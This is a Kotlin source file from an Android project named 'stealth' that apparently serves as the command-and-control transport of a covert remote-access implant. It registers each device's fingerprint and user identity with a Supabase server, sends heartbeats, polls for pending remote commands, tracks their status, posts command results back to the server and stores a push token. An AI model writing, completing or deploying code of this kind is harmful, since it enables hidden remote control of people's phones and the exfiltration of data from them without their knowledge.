package com.kaze.stealth

import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone
import java.util.concurrent.TimeUnit

object Transport {
    private const val TAG = "STEALTH"
    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    private val jsonType = "application/json; charset=utf-8".toMediaType()

    private fun nowIso(): String {
        return SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).apply {
            timeZone = TimeZone.getTimeZone("UTC")
        }.format(Date())
    }

    private fun headers(): Map<String, String> = mapOf(
        "apikey" to Config.SUPABASE_KEY,
        "Authorization" to "Bearer ${Config.SUPABASE_KEY}",
        "Content-Type" to "application/json",
        "Prefer" to "return=minimal"
    )

    private fun supabasePost(table: String, body: JSONObject): Boolean {
        return try {
            val url = "${Config.SUPABASE_REST}/$table"
            val reqBuilder = Request.Builder().url(url).post(body.toString().toRequestBody(jsonType))
            headers().forEach { (k, v) -> reqBuilder.addHeader(k, v) }
            client.newCall(reqBuilder.build()).execute().use { it.isSuccessful }
        } catch (e: Exception) {
            Log.e(TAG, "supabasePost error: ${e.message}")
            false
        }
    }

    private fun supabaseSelect(table: String, query: String): String? {
        return try {
            val url = "${Config.SUPABASE_REST}/$table?$query"
            val reqBuilder = Request.Builder().url(url).get()
            headers().forEach { (k, v) -> reqBuilder.addHeader(k, v) }
            reqBuilder.addHeader("Prefer", "return=representation")
            client.newCall(reqBuilder.build()).execute().use { resp ->
                if (resp.isSuccessful) resp.body?.string() else null
            }
        } catch (e: Exception) {
            Log.e(TAG, "supabaseSelect error: ${e.message}")
            null
        }
    }

    private fun supabaseUpdate(table: String, match: JSONObject, patch: JSONObject): Boolean {
        return try {
            val filter = match.keys().asSequence().joinToString("&") { key ->
                "$key=eq.${match.getString(key)}"
            }
            val url = "${Config.SUPABASE_REST}/$table?$filter"
            val reqBuilder = Request.Builder().url(url)
                .patch(patch.toString().toRequestBody(jsonType))
            headers().forEach { (k, v) -> reqBuilder.addHeader(k, v) }
            client.newCall(reqBuilder.build()).execute().use { it.isSuccessful }
        } catch (e: Exception) {
            Log.e(TAG, "supabaseUpdate error: ${e.message}")
            false
        }
    }

    fun registerDevice(deviceId: String, fingerprint: String, username: String = "", userId: String = "") {
        val body = JSONObject().apply {
            put("id", deviceId)
            put("fingerprint", fingerprint)
            put("username", username)
            put("user_id", userId)
            put("last_seen", nowIso())
            put("is_active", true)
        }
        supabasePost(Config.TABLE_DEVICES, body)
    }

    fun updateHeartbeat(deviceId: String, username: String = "", userId: String = "") {
        val match = JSONObject().put("id", deviceId)
        val patch = JSONObject().apply {
            put("last_seen", nowIso())
            put("is_active", true)
            if (username.isNotEmpty()) put("username", username)
            if (userId.isNotEmpty()) put("user_id", userId)
        }
        supabaseUpdate(Config.TABLE_DEVICES, match, patch)
    }

    fun pollCommands(deviceId: String): List<Pair<String, String>> {
        val maxAgeMs = System.currentTimeMillis() - Config.MAX_COMMAND_AGE_MS
        val maxAgeIso = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).apply {
            timeZone = TimeZone.getTimeZone("UTC")
        }.format(Date(maxAgeMs))

        val query = "device_id=eq.$deviceId&status=eq.pending&created_at=gt.$maxAgeIso&order=created_at.asc&limit=5"
        val resp = supabaseSelect(Config.TABLE_COMMANDS, query) ?: return emptyList()
        val commands = mutableListOf<Pair<String, String>>()
        try {
            val arr = JSONArray(resp)
            for (i in 0 until arr.length()) {
                val obj = arr.getJSONObject(i)
                val id = obj.getString("id")
                val cmd = obj.getString("command")
                commands.add(id to cmd)
            }
        } catch (e: Exception) {
            Log.e(TAG, "pollCommands parse error: ${e.message}")
        }
        return commands
    }

    fun markCommandFailed(commandId: String, deviceId: String) {
        val match = JSONObject().apply {
            put("id", commandId)
            put("device_id", deviceId)
        }
        val patch = JSONObject().put("status", "failed")
        supabaseUpdate(Config.TABLE_COMMANDS, match, patch)
    }

    fun cleanupStaleCommands(deviceId: String) {
        try {
            val query = "device_id=eq.$deviceId&status=eq.running"
            val resp = supabaseSelect(Config.TABLE_COMMANDS, query) ?: return
            val arr = JSONArray(resp)
            for (i in 0 until arr.length()) {
                val id = arr.getJSONObject(i).getString("id")
                val match = JSONObject().put("id", id)
                val patch = JSONObject().put("status", "pending")
                supabaseUpdate(Config.TABLE_COMMANDS, match, patch)
                Log.d(TAG, "Reset stale running command: $id")
            }
        } catch (e: Exception) {
            Log.e(TAG, "cleanupStaleCommands error: ${e.message}")
        }
    }

    fun markCommandRunning(commandId: String, deviceId: String) {
        val match = JSONObject().apply {
            put("id", commandId)
            put("device_id", deviceId)
        }
        val patch = JSONObject().put("status", "running")
        supabaseUpdate(Config.TABLE_COMMANDS, match, patch)
    }

    fun markCommandCompleted(commandId: String, deviceId: String) {
        val match = JSONObject().apply {
            put("id", commandId)
            put("device_id", deviceId)
        }
        val patch = JSONObject().apply {
            put("status", "completed")
            put("completed_at", nowIso())
        }
        supabaseUpdate(Config.TABLE_COMMANDS, match, patch)
    }

    fun sendResult(commandId: String, deviceId: String, result: String): Boolean {
        val body = JSONObject().apply {
            put("command_id", commandId)
            put("device_id", deviceId)
            put("result", result)
        }
        return supabasePost(Config.TABLE_RESULTS, body)
    }

    fun saveFcmToken(deviceId: String, token: String) {
        val match = JSONObject().put("id", deviceId)
        val patch = JSONObject().put("fcm_token", token)
        supabaseUpdate(Config.TABLE_DEVICES, match, patch)
    }
}
